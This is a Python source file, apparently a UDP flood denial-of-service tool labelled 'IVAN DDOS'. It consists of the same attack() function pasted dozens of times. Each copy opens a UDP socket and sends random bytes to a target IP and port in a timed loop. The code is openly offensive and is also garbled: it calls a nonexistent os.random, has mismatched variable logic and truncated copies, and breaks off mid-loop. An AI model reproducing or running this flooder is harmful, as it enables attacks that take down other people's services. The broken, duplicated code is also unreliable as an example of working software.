        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
